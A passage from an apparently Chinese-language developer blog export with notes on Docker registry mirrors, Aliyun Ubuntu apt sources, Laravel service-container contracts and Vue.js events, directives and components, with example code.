<h4 id="2-2-如何在windows和linux统一挂载的路径"><a href="#2-2-如何在windows和linux统一挂载的路径" class="headerlink" title="2.2 如何在windows和linux统一挂载的路径"></a>2.2 如何在<code>windows</code>和<code>linux</code>统一挂载的路径</h4><p>&emsp; 由于<code>windows</code>的文件路径是有盘符的，跟<code>linux</code>不是一致的，可以在<code>windows</code>的环境变量添加<code>COMPOSE_CONVERT_WINDOWS_PATHS=1</code>或者在项目的根据目录下的<code>.env</code>文件下加入，最后的路径以类<code>unix</code>为准,如<code>C:\B\A\</code>则是<code>/C/B/A/</code></p>
<h4 id="3-2-关于镜像下载慢的问题"><a href="#3-2-关于镜像下载慢的问题" class="headerlink" title="3.2 关于镜像下载慢的问题"></a>3.2 关于镜像下载慢的问题</h4><p>&emsp; 可以在把:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="string">"http://ovfftd6p.mirror.aliyuncs.com"</span>,</span><br><span class="line"><span class="string">"http://registry.docker-cn.com"</span>,</span><br><span class="line"><span class="string">"http://docker.mirrors.ustc.edu.cn"</span>,</span><br><span class="line"><span class="string">"http://hub-mirror.c.163.com"</span></span><br></pre></td></tr></table></figure></div></p>
<p>加入到 <code>setting &gt; Docker Engine</code> 下的<code>registry-mirrors</code>,以数组的形式</p>
]]></content>
      <tags>
        <tag>vagrant</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】国内正常点的源</title>
    <url>/2020/03/09/%E3%80%90linux%E3%80%91%E5%9B%BD%E5%86%85%E6%AD%A3%E5%B8%B8%E7%82%B9%E7%9A%84%E6%BA%90/</url>
    <content><![CDATA[<h2 id="ubuntu源-阿里"><a href="#ubuntu源-阿里" class="headerlink" title="ubuntu源(阿里)"></a>ubuntu源(阿里)</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>]]></content>
      <tags>
        <tag>ubuntu源</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】laravel学习笔记-契约</title>
    <url>/2020/02/25/%E3%80%90php%E3%80%91laravel%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A5%91%E7%BA%A6/</url>
    <content><![CDATA[<h3 id="1-什么是契约"><a href="#1-什么是契约" class="headerlink" title="1 什么是契约?"></a>1 什么是契约?</h3><p>&emsp;什么是契约？为什么要用契约?契约能带来什么好处？<br>&emsp;契约其实就是<code>DI</code>依赖注入的注入类的声明关系，它在<code>register</code>方法中声明了什么样的类型提示要注入时对应什么样的类？关于依赖注入不明白的可以参考<a href="/2020/02/03/【php】hyperf笔记-依赖注入/">《【php】hyperf笔记-依赖注入》</a>的说明。<br>&emsp;为什么要用契约?契约能带来什么好处？<br>&emsp; 上面说了，依赖注入是根据类型提示符来注入对应的类，如果在程序中各个地方使用这种（实际上laravel只能在控制器能使用依赖注入）基于提示符来注入依赖，哪天要修改替换为哪一个类时也只需要修改类型提示符关联的类就行了，从使所以的通过依赖注入的实例都生效。还有由于依赖注的实例统一在一个地方生成的，可以进行干预处理，从而影响到全局的程序，也就是面向切面(AOP);<br>&emsp;而用契约能使代码看起更明确，更统一。</p>
<a id="more"></a>
<h3 id="2-示例代码"><a href="#2-示例代码" class="headerlink" title="2 示例代码"></a>2 示例代码</h3><h4 id="2-1-订单服务类"><a href="#2-1-订单服务类" class="headerlink" title="2.1 订单服务类"></a>2.1 订单服务类</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Service</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">EasyWeChat</span>\<span class="title">Factory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Model</span>\&#123;</span><br><span class="line">    <span class="title">CaseOrder</span> <span class="title">as</span> <span class="title">CaseOrderModel</span>,</span><br><span class="line">    <span class="title">PayTimes</span> <span class="title">as</span> <span class="title">PayTimesModel</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Model</span>\<span class="title">Cases</span> <span class="title">as</span> <span class="title">CasesModel</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Storage</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">CaseOrder</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 分期表</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayTimesById</span><span class="params">($order_id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $PayTimes = (<span class="keyword">new</span> PayTimesModel())-&gt;where(<span class="string">'order_id'</span>, $order_id)</span><br><span class="line">            -&gt;get()</span><br><span class="line">            -&gt;makeHidden([<span class="string">'created_at'</span>, <span class="string">'updated_at'</span>, <span class="string">'order_id'</span>]);</span><br><span class="line">        <span class="keyword">return</span> $PayTimes-&gt;toArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-2-声明依赖"><a href="#2-2-声明依赖" class="headerlink" title="2.2 声明依赖"></a>2.2 声明依赖</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Service</span>\&#123;</span><br><span class="line">    <span class="title">CaseOrder</span>  <span class="title">as</span> <span class="title">CaseOrderService</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 契约注册 提示符 对应类</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bind(CaseOrderService::class, CaseOrderService::class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-3-控制器使用"><a href="#2-3-控制器使用" class="headerlink" title="2.3 控制器使用"></a>2.3 控制器使用</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Api</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Service</span>\&#123;</span><br><span class="line">    <span class="title">CaseOrder</span> <span class="title">as</span> <span class="title">CaseOrderService</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaseOrderController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 分期表</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">payTimesIndex</span><span class="params">(CaseOrderService $CaseOrderService)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pay_times_list = $CaseOrderService-&gt;getPayTimesById($Request-&gt;id);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;responseSuccessData($pay_times_list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>larvel</tag>
        <tag>契约</tag>
      </tags>
  </entry>
  <entry>
    <title>【前端】vue学习笔记</title>
    <url>/2020/02/13/%E3%80%90%E5%89%8D%E7%AB%AF%E3%80%91vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1-emit和on的用法"><a href="#1-emit和on的用法" class="headerlink" title="1 emit和on的用法"></a>1 emit和on的用法</h3><p>&emsp; <code>emit</code>用于调用自定义事件是事件是消费方，<code>on</code>用于指明事件要调用的方法是调度方。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCUMENT&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue_demo.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"boost"</span>&gt;</span>触发事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">"#root"</span>,</span></span><br><span class="line">            data() &#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                    message: <span class="string">'hello world'</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            created() &#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.$on(<span class="string">'my_events'</span>, <span class="keyword">this</span>.handleEvents);  <span class="comment">// 指明要调度的事件方法1</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.$on(<span class="string">'my_events'</span>, <span class="keyword">this</span>.handleEvents1); <span class="comment">// 指明要调度的事件方法2</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.$on(<span class="string">'my_events'</span>, <span class="keyword">this</span>.handleEvents2); <span class="comment">// 指明要调度的事件方法3</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                handleEvents(e, a) &#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="keyword">this</span>.message, e)</span></span><br><span class="line">                &#125;,</span><br><span class="line">                handleEvents1(e) &#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="keyword">this</span>.message, e)</span></span><br><span class="line">                &#125;,</span><br><span class="line">                handleEvents2(e) &#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="keyword">this</span>.message, e)</span></span><br><span class="line">                &#125;,</span><br><span class="line">                boost() &#123;</span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.$emit(<span class="string">'my_events'</span>, <span class="string">'my params'</span>); <span class="comment">//消费方</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<a id="more"></a>
<p>&emsp;那这个有什么用呢？还不知道，由于叫事件，通常用于全局使用吧，这样能对代码进行切片，降低耦合。</p>
<h3 id="Vue-directive的使用-自定义指令"><a href="#Vue-directive的使用-自定义指令" class="headerlink" title="Vue.directive的使用-自定义指令"></a><code>Vue.directive</code>的使用-自定义指令</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>directive 用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--使用指令，可以在任意标签内的属性中 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-loading</span>=<span class="string">"isLoading"</span>&gt;</span>&#123;&#123;data&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>  @<span class="attr">click</span>=<span class="string">"update_data"</span>&gt;</span>更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 注册指令</span></span></span><br><span class="line"><span class="javascript">            Vue.directive(<span class="string">'loading'</span>, &#123;</span></span><br><span class="line">                update(el, binding, vnode) &#123;</span><br><span class="line">                    if (binding.value) &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">const</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript">                        div.innerText = <span class="string">'加载中...'</span>;</span></span><br><span class="line"><span class="javascript">                        div.setAttribute(<span class="string">'id'</span>, <span class="string">'loading'</span>);</span></span><br><span class="line"><span class="javascript">                        div.style.position = <span class="string">'fixed'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.left = <span class="string">'0'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.top = <span class="string">'0'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.width = <span class="string">'100%'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.height = <span class="string">'100%'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.display = <span class="string">'flex'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.justifyContent = <span class="string">'center'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.alignItems = <span class="string">'center'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.color = <span class="string">'white'</span>;</span></span><br><span class="line"><span class="javascript">                        div.style.background = <span class="string">'rgba(0, 0, 0, .7)'</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.body.append(div);</span></span><br><span class="line"><span class="javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.body.removeChild(<span class="built_in">document</span>.getElementById(<span class="string">'loading'</span>));</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">"#root"</span>,</span></span><br><span class="line">                data: &#123;</span><br><span class="line"><span class="javascript">                    isLoading: <span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">                    data: <span class="string">''</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    update_data() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.isLoading = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">                        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">this</span>.data = <span class="string">'用户数据'</span>;</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">this</span>.isLoading = <span class="literal">false</span>;</span></span><br><span class="line">                        &#125;, 3000)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>&emsp; 以上<code>demo</code>演示当数据加载时，页面覆盖一层半透明遮蔽层<code>div</code>,相对以往的侵入式，在注册好指令后可以在多个组件进行调用而不用在多个页面上重复地写.</p>
<h3 id="2-Vue-component的用法"><a href="#2-Vue-component的用法" class="headerlink" title="2 Vue.component的用法"></a>2 <code>Vue.component</code>的用法</h3><p>&emsp; 新建组件demo<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.Conponent 用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Test</span> <span class="attr">:msg</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            Vue.component(<span class="string">'Test'</span>, &#123;</span></span><br><span class="line"><span class="xml">                template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line">                props: &#123;</span><br><span class="line">                    msg: &#123;</span><br><span class="line"><span class="javascript">                        type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">default</span>: <span class="string">'default message'</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root'</span>,</span></span><br><span class="line"><span class="javascript">                data: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                        message: <span class="string">"test Component"</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<h3 id="3-Vue-extend用法"><a href="#3-Vue-extend用法" class="headerlink" title="3  Vue.extend用法"></a>3  <code>Vue.extend</code>用法</h3><p>&emsp;<code>Vue.extend</code>同上的一样，都是新建组件的。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.extend 用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Test</span> <span class="attr">:msg</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> component = Vue.extend(&#123;</span></span><br><span class="line"><span class="xml">                template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line">                props: &#123;</span><br><span class="line">                    msg: &#123;</span><br><span class="line"><span class="javascript">                        type: <span class="built_in">String</span>(),</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">default</span>: <span class="string">'default message'</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            Vue.component(<span class="string">'Test'</span>, component);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root'</span>,</span></span><br><span class="line"><span class="javascript">                data: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                        message: <span class="string">"test Extend Component"</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<h4 id="3-2-用Vue-extend封装通用的加载庶罩层"><a href="#3-2-用Vue-extend封装通用的加载庶罩层" class="headerlink" title="3.2 用Vue.extend封装通用的加载庶罩层"></a>3.2 用<code>Vue.extend</code>封装通用的加载庶罩层</h4><p>&emsp; 在组件内暴露的调用接口为：</p>
<ul>
<li>使用: <code>Vue.prototype.loading(:String arg)</code>;</li>
<li>关闭 <code>Vue.prototype.loadiong()()</code><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.extend 用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">            <span class="selector-id">#loading-wrapper</span> &#123;</span></span><br><span class="line">                position: fixed;</span><br><span class="line">                top: 0;</span><br><span class="line">                left: 0;</span><br><span class="line">                display: flex;</span><br><span class="line">                justify-content: center;</span><br><span class="line">                align-items: center;</span><br><span class="line">                width: 100%;</span><br><span class="line">                height: 100%;</span><br><span class="line"><span class="css">                <span class="selector-tag">background</span>: <span class="selector-tag">rgba</span>(0, 0, 0, <span class="selector-class">.7</span>);</span></span><br><span class="line"><span class="css">                <span class="selector-tag">color</span>: <span class="selector-id">#ffffff</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"showLoading"</span>&gt;</span>显示loading<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">Loading</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> LoadingComponent = Vue.extend(&#123;</span></span><br><span class="line"><span class="xml">                    template: '<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span 